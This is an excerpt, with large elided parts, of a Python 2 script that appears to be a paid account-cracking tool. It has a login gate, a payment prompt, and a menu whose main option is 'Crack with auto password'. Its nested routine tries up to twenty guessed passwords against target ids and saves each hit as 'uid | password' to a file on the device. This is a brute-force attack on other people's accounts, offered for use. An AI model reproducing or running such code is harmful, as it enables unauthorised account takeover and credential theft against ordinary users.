...
def hira():
    ...
    if rana in hira:
        os.system('clear')
        os.system('echo -e "LOGIN SUCCESSFUL"  | lolcat  -a -d 20 -s 10000')
        time.sleep(4)
        ip()
    else:
        os.system('clear')
...
def hira_n():
    ...
    print ''
    print '\x1b[1;91m           SEND 10$ AND SEND SCREENSHOT OF PAYEMENT S'
    print ''
...
def ip():
    ...
    print '\x1b[0;96m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\x1b[0;96m Your country: ' + country
    time.sleep(2)
    print ''
    print '\x1b[1;96m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \x1b[1;96mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
...
def menu():
    ...
    print logo
    print ''
    print '  \x1b[1;92mLogged in user: HEDI USR'
    print ''
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\x1b[1;92m[1] \x1b[0;96mCrack with auto password'
    print '\x1b[1;92m[2] \x1b[0;96mExtract Link For File'
    print '\x1b[1;92m[3] \x1b[0;96mView token'
    print '\x1b[1;92m[4] \x1b[0;96mLogout'
    print '\x1b[1;92m[5] \x1b[0;96mDelete trash files'
    print ''
    menu_s()
...
def a_s():
    ...
    if a_s == '1':
        ...
        print ''
        print '\x1b[0;96m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;32;40m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;32;40m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;32;40m[9]Name + digit: ')
        pass4 = raw_input('\x1b[1;32;40m[10]Password: ')
        pass5 = raw_input('\x1b[1;32;40m[11]Password: ')
        pass6= raw_input('\x1b[1;32;40m[17]Password: ')
        pass7 = raw_input('\x1b[1;32;40m[18]Password: ')
        pass8 = raw_input('\x1b[1;32;40m[19]Password: ')
        pass9 = raw_input('\x1b[1;32;40m[20]Password: ')
        idt = raw_input('\033[41m\033[\xe2\x98\x85]Enter id: ')
        ...
        print ''
        print ' \x1b[0;96mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;32;40m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;32;40m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;32;40m[9]Name + digit: ')
        ...
        print logo
        print ''
        print '\x1b[1;31;1m~~~~ Auto pass File cracking ~~~~'
        print ''
        print '\x1b[0;96m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \x1b[1;32;40m[1]Name + digit: ')
    ...
    print ''
    print 47 * '-'
    print '\033[41m\033[1;37m Wait now For  \033[41m\033[1;37mMr OK/CP\x1b[0m.'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass9
                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass10
                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    ...
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass11
                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        ...
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass12
                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            ...
                                                            q = json.loads(data)
                                                            if 'loc' in q:
                                                                print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass13
                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                ok.write(uid + ' | ' + pass13 + '\n')
                                                                ok.close()
                                                                ...
                                                                q = json.loads(data)
                                                                if 'loc' in q:
                                                                    print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass14
                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                                    ok.close()
                                                                    ...
                                                                    q = json.loads(data)
                                                                    if 'loc' in q:
                                                                        print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass15
                                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                        ok.write(uid + ' | ' + pass15 + '\n')
                                                                        ok.close()
                                                                        ...
                                                                        q = json.loads(data)
                                                                        if 'loc' in q:
                                                                            print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass16
                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                            ok.write(uid + ' | ' + pass16 + '\n')
                                                                            ok.close()
                                                                            ...
                                                                            q = json.loads(data)
                                                                            if 'loc' in q:
                                                                                print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass17
                                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                ok.write(uid + ' | ' + pass17 + '\n')
                                                                                ok.close()
                                                                                ...
                                                                                q = json.loads(data)
                                                                                if 'loc' in q:
                                                                                    print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass18
                                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                    ok.write(uid + ' | ' + pass18 + '\n')
                                                                                    ok.close()
                                                                                    ...
                                                                                    q = json.loads(data)
                                                                                    if 'loc' in q:
                                                                                        print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass19
                                                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                        ok.write(uid + ' | ' + pass19 + '\n')
                                                                                        ok.close()
                                                                                        ...
                                                                                        q = json.loads(data)
                                                                                        if 'loc' in q:
                                                                                            print '\x1b[1;92m[CoD3R-OK] ' + uid + ' | ' + pass20
                                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                            ok.write(uid + ' | ' + pass20 + '\n')
                                                                                            ok.close()
